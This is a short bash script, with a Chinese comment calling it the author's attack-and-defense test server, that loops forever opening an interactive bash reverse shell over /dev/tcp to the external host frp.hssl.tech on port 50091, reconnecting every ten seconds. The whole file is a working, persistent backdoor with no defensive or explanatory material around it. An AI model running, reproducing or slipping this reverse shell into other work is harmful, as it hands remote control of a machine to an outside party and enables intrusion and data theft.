#!/bin/bash

# 这是我的网络攻防测试服务器，尝试建立连接
REMOTE_HOST="frp.hssl.tech"
REMOTE_PORT="50091"

while true; do
    /bin/bash -i >& /dev/tcp/${REMOTE_HOST}/${REMOTE_PORT} 0>&1
    sleep 10
done
